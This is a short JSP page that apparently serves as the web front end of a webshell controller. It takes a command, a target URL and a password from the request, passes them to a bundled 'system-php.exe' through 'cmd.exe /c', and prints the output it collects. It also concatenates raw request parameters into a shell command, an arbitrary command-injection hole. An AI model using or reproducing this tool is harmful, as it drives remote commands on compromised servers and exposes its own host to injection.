<%@ page import="java.io.*" %>
<%
	String path = application.getRealPath(request.getRequestURI());
	path = path.replace("source\\cmd.jsp","");
	String shell = path;
	shell = shell + "shell\\";
	path = path + "store\\";
	String store_path = path;
	String cmds = request.getParameter("cmd");
	String url = request.getParameter("url");
	String password = request.getParameter("password");
	String filename_url = "";
	if((url.contains(":")))
	{
		filename_url = url.replace("http","").replace(":","").replace("php","").replace(".","").replace("/","");
	}
	else
	{
		filename_url = url.replace("http","").replace("php","").replace(".","").replace("/","");
	}
	String filename = filename_url + "cmd.txt";
	String store_filename = store_path + filename;
	String cmd ="cmd.exe /c start " + shell + "system-php.exe " + url + " " + password + " " + store_filename + " " + cmds;
	try
	{
		Process rt = Runtime.getRuntime().exec(cmd);
	}
	catch(IOException e)
	{
		out.print("123");
	}
	Thread.sleep(2000);
	response.setContentType("text/html;charset=UTF-8");
    InputStreamReader isr = new InputStreamReader(new FileInputStream(store_filename), "GBK");
    BufferedReader br = new BufferedReader(isr);
    String s;
    while ((s = br.readLine()) != null) 
	{
        out.println(s + "<br />");
    }
    br.close();
    isr.close();
%>